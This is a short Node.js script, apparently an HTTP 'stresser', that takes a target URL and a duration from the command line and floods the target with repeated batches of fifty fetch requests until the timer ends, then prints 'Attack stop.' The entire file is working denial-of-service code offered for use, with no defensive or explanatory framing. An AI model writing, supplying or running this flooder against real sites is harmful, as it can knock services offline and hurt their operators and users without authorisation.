const target = process.argv[2];
const duration = process.argv[3];

if (process.argv.length < 4 || isNaN(parseInt(duration))) {
    console.log('Usage Not Required!');
    process.exit(1)
} else {
    const XLOLSTRESSER = setInterval(() => {
        for (let i = 0; i < 50; i++) {
            fetch(target).catch(error => {});
        }
        
    });

    setTimeout(() => {
        clearInterval(XLOLSTRESSER);
        console.log('Attack stop.');
        process.exit(0);
    }, duration * 1000);
}